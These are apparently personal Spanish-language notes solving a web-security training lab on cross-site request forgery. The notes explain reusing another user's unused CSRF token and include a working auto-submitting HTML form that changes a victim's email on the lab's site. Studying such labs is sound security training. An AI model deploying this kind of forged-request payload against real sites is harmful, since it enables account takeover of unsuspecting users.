## Objetivo:

![[Pasted image 20240515232215.png]]


## Solucion:

Usar el CSRF de otro usuario, el CSRF a usar es el que devuelve el servidor luego de hacer una consulta, ya que en la siguiente consulta que se haga al server éste mismo estará esperando como request el CSRF que éste mismo envio en la consulta anterior...

Igual, esto consiste en usar un CSRF (que no haya sido usado) de algun otro usuario para hacer el ataque.

![[Pasted image 20240515232802.png]]



![[Pasted image 20240515233057.png]]


```
<body>

<form action="https://0afb001b04e13580803330ee00840097.web-security-academy.net/my-account/change-email" method="post">

<input type="hidden" name="email" value="pwned@gmail.com" />

<input type="hidden" name="csrf" value="yMBCYu5eXS7vaHyFVfJEAzfg3Ef3fXH5" />

</form>

<script>

document.forms[0].submit()

</script>

</body>
```
